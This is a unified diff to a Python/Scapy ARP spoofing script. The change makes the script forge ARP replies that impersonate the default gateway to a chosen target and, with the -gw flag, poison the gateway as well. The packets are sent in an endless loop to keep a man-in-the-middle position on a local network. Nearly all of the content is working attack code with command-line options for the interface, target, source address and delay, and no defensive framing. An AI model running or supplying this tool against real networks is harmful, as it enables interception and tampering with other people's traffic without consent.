@@ -3,11 +3,10 @@ import argparse
 import time
 
 ARP_ISAT_CODE = 2
-DELAY_TIME = 0.5
 IP_REGEX = "^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$"
 
 
-def getMACbyIP(ip):
+def get_mac_by_ip(ip):
     """
     get MAC address of a specified IP.
     """
@@ -30,32 +29,33 @@ def spoof(args : dict):
     """
     param args: dictionary of arguments.
     supports: - interface (assuming valid)
-              - source
+              - source (default is gateway)
               - delay
               - gw
               - target(required)
     """
+    # get gw ip
+    gw_ip = conf.route.route("0.0.0.0")[2]
     # get target MAC address
-    target_mac = getMACbyIP(args['target'][0])
+    target_mac = get_mac_by_ip(args['target'])
 
     if not target_mac:
-        print("IP target not found")
+        print("target IP mac address could not be resolved")
         return
 
     # create the arp packet
-    arp_isat_packet = Ether(dst=target_mac)/ARP(op=ARP_ISAT_CODE,pdst=args['target'][0],psrc=args['target'][1])
+    arp_packets = list(Ether(dst=target_mac)/ARP(op=ARP_ISAT_CODE,pdst=args['target'],hwdst=target_mac,\
+                                                psrc=args['src'] if args['src'] else gw_ip))
 
-    if args['delay'] is not None:
-        DELAY_TIME = args['delay']
-    if args["src"] is not None:
-        arp_isat_packet[Ether].src = args["src"]
-        arp_isat_packet[ARP].hwsrc = args["src"]
-
+    # if gw is to be attacked as well, create a packet
+    if args['gw']:
+        # get gateway MAC address
+        gw_mac = get_mac_by_ip(gw_ip)
+        # create the arp packet
+        arp_packets.append(Ether(dst=gw_mac)/ARP(op=ARP_ISAT_CODE,pdst=gw_ip,hwdst=gw_mac,psrc=args['target']))
+    
     # send the arp packets to the target every DELAY_TIME sec
-    while(True):
-        sendp(arp_isat_packet, iface=args[interface], verbose=0)
-
-        time.sleep(DELAY_TIME)
+    sendp(arp_packets, inter=args['delay'], loop=1, iface=args['iface'], verbose=0)
 
 
 def main():
@@ -63,13 +63,9 @@ def main():
     parser = argparse.ArgumentParser(description="Spoof ARP tables")
     parser.add_argument("-i","--iface", help="Interface you wish to use", choices=get_if_list())
     parser.add_argument("-s","--src", type=validate_ip_address, help="The address you want for the attacker")
-    parser.add_argument("-d","--delay", type=int, help="Delay (in seconds) between messages")
+    parser.add_argument("-d","--delay", type=float, default=1, help="Delay (in seconds) between messages")
     parser.add_argument("-gw", action='store_true', help="should GW be attacked as well")
-    parser.add_argument("-t","--target", help="IP of target", nargs=2, type=validate_ip_address, required=True)
-
-
-    #TODO: add gw suppurt
-    #  gw = conf.route.route("0.0.0.0")[2]
+    parser.add_argument("-t","--target", help="IP of target", type=validate_ip_address, required=True)
     
     args = parser.parse_args()
     spoof(vars(args))
